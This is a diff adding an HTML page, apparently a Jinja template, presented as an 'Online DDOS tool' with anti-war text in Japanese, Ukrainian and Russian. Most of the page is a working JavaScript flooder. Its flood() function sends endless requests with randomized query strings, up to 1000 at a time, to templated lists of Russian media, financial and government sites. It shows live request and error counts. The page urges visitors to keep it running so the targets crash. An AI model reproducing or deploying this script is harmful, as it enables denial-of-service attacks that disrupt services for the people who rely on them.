@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="ja">
+    <script>
+    (function(){
+        class RuffleMimeType{
+            constructor(a,b,c){
+                this.type = a,this.description = b,this.suffixes = c
+            }
+        }
+        class RuffleMimeTypeArray{
+            constructor(a){
+                this.__mimetypes=[],this.__named_mimetypes = {};
+                for(let b of a) this.install(b)
+            }
+            install(a){
+                let b=this.__mimetypes.length;
+                this.__mimetypes.push(a),this.__named_mimetypes[a.type] = a,this[a.type] = a,this[b] = a
+            }
+            item(a){
+                return this.__mimetypes[a]
+            }
+            namedItem(a){
+                return this.__named_mimetypes[a]
+            }
+            get length(){
+                return this.__mimetypes.length
+            }
+        }
+        class RufflePlugin extends RuffleMimeTypeArray{
+            constructor(a,b,c,d){
+                super(d),this.name = a,this.description = b,this.filename = c
+            }
+            install(a){
+                a.enabledPlugin||(a.enabledPlugin = this),super.install(a)
+            }
+        }
+        class RufflePluginArray{
+            constructor(a){
+                this.__plugins=[],this.__named_plugins={};
+                for(let b of a)this.install(b)
+            }
+            install(a){
+                let b=this.__plugins.length;
+                this.__plugins.push(a),this.__named_plugins[a.name]=a,this[a.name]=a,this[b]=a
+            }
+            item(a){
+                return this.__plugins[a]
+            }
+            namedItem(a){
+                return this.__named_plugins[a]
+            }
+            get length(){
+                return this.__plugins.length
+            }
+        }
+        const FLASH_PLUGIN = new RufflePlugin("Shockwave Flash","Shockwave Flash 32.0 r0","ruffle.js",[new RuffleMimeType("application/futuresplash","Shockwave Flash","spl"),new RuffleMimeType("application/x-shockwave-flash","Shockwave Flash","swf"),new RuffleMimeType("application/x-shockwave-flash2-preview","Shockwave Flash","swf"),new RuffleMimeType("application/vnd.adobe.flash-movie","Shockwave Flash","swf")]);
+        function install_plugin(a){
+            navigator.plugins.install||Object.defineProperty(navigator,"plugins", {
+                value:new RufflePluginArray(navigator.plugins),writable:!1
+            }),navigator.plugins.install(a),0<a.length&&!navigator.mimeTypes.install&&Object.defineProperty(navigator,"mimeTypes",{
+                value:new RuffleMimeTypeArray(navigator.mimeTypes),writable:!1
+            });
+            for(var b=0;b<a.length;b+=1) navigator.mimeTypes.install(a[b])
+        }
+        install_plugin(FLASH_PLUGIN);
+    })();
+    </script>
+    <script src="files/ruffle.js"></script>
+    <head>
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <title>Online DDOS tool - Russian warship, go fuck yourself</title>
+    </head>
+    <body>
+        <h1>UPDATED NEW LINKS - DDOS Script - Fuck the war!</h1>
+        <table width="100%">
+        <tbody><tr>
+        <td width="30%">
+            <h3>Japanese - 日本語版</h3>
+            <p>ロシアは国営メディアを通じて誤報と嘘を流し、国民に自由と統一の名の下にそれを伝えている。その一方で、ロシア軍は病院や子どもたち、救急車を攻撃するなど、広範な戦争犯罪を犯しています。</p>
+            <p>このウェブサイトには、ロシアのメディア、メッセージング、金融、政府のサービスに常に偽のリクエストを送り続け、最終的にこれらのサイトをクラッシュさせるスクリプトが含まれています。</p>
+            <p>あなたの Web ブラウザは遅くなり始めるかもしれませんが、この小さな貢献は、ロシアの戦意と士気を低下させるのに非常に役立ちます。</p>
+            <p>現在のセッションの統計は、以下で確認できます。リクエスト数は、Web サイトがリクエストされた回数です。エラーの数は、ウェブサイトが何回返信できなかったかを示しています。</p>
+            <p>ウクライナに栄光あれ</p>
+        </td>
+        <td width="30%">
+            <h3>Ukrainian - Українська версія</h3>
+            <p>Росія поширює дезінформацію та брехню у своїх контрольованих державою ЗМІ, розповідаючи населенню, що це в ім’я свободи та єдності. Тим часом російські війська вчиняють масові військові злочини, атакуючи лікарні, дітей та машини швидкої допомоги.</p>
+            <p>Цей веб-сайт містить сценарій, який постійно наповнює російські ЗМІ, повідомлення, фінансові та державні служби фальшивими запитами, що в кінцевому підсумку призводить до збою цих сайтів.</p>
+            <p>Ваш веб-браузер може почати гальмувати, але цей невеликий внесок надзвичайно допоможе уповільнити військові зусилля та моральний дух Росії.</p>
+            <p>Нижче наведено статистику поточної сесії. Кількість запитів – це кількість запитів на веб-сайт. Кількість помилок показує, скільки разів веб-сайт не відповів.</p>
+            <p>слава Україні</p>
+        </td>
+        <td width="30%">
+            <h3>Russian - Русская версия</h3>
+            <p>Россия распространяет дезинформацию и ложь через свои подконтрольные государству СМИ, говоря населению, что это во имя свободы и единства. Тем временем российские войска совершают широкомасштабные военные преступления, нападая на больницы, детей и машины скорой помощи.</p>
+            <p>Этот веб-сайт содержит скрипт, который постоянно наводняет российские СМИ, мессенджеры, финансовые и государственные службы поддельными запросами, что в конечном итоге приводит к сбою этих сайтов.</p>
+            <p>Статистику текущего сеанса можно найти ниже. Количество запросов — это количество запросов к веб-сайту. Количество ошибок — это количество раз, когда веб-сайт не ответил.</p>
+            <p>Ваш веб-браузер может начать работать медленнее, но этот небольшой вклад очень поможет замедлить боевой дух и боевой дух русских.</p>
+            <p>слава украине</p>
+        </td>
+        </tr></tbody>
+        </table>
+        <div id="stats">
+            <table width="90%">
+                <thead>
+                    <tr>
+                        <th>URL</th>
+                        <th>Number of Requests</th>
+                        <th>Number of Errors</th>
+                    </tr>
+                </thead>
+                <tbody>
+                  {% for target in targets %}
+                  <tr>
+                    <td>{{ target }}</td>
+                    <td>0</td>
+                    <td>0</td>
+                  </tr>
+                  {% endfor %}
+                </tbody>
+            </table>
+        </div>
+        
+        <script>
+        var targets = [
+            {% for target in targets %}
+            '{{ target }}',
+            {% endfor %}
+        ]
+        
+        var targetStats = {}
+        targets.forEach((target) => {
+            targetStats[target] = { number_of_requests: 0, number_of_errored_responses: 0 }
+        })
+        
+        var statsEl = document.getElementById('stats');
+        function printStats() {
+            statsEl.innerHTML = '<table width="90%"><thead><tr><th>URL</th><th>Number of Requests</th><th>Number of Errors</th></tr></thead><tbody>' + Object.entries(targetStats).map(([target, { number_of_requests, number_of_errored_responses  }]) => '<tr><td>' + target + '</td><td>' + number_of_requests + '</td><td>' + number_of_errored_responses + '</td></tr>').join('') + '</tbody></table>'
+        }
+        setInterval(printStats, 200);
+        
+        var CONCURRENCY_LIMIT = 1000
+        var queue = []
+        
+        async function fetchWithTimeout(resource, options) {
+            const controller = new AbortController();
+            const id = setTimeout(() => controller.abort(), options.timeout);
+            return fetch(resource, {
+                method: 'GET',
+                mode: 'no-cors',
+                signal: controller.signal
+            }).then((response) => {
+                clearTimeout(id);
+                return response;
+            }).catch((error) => {
+                clearTimeout(id);
+                throw error;
+            });
+        }
+        
+        async function flood(target) {
+            for (var i = 0;; i=(i+1)|0) {
+                if (queue.length > CONCURRENCY_LIMIT) {
+                    await queue.shift()
+                }
+                rand = i % 3 === 0 ? '' : ('?' + Math.random() * 1000)
+                queue.push(
+                    fetchWithTimeout(target + rand, { timeout: 1000 })
+                    .catch((error) => {
+                        if (error.code === 20 /* ABORT */) {
+                            return;
+                        }
+                        targetStats[target].number_of_errored_responses++;
+                    })
+                    .then((response) => {
+                        if (response && !response.ok) {
+                            targetStats[target].number_of_errored_responses++;
+                        }
+                        targetStats[target].number_of_requests++;
+                    })
+                )
+            }
+        }
+        
+        // Start
+        targets.map(flood)
+        </script>
+    </body>
+</html>
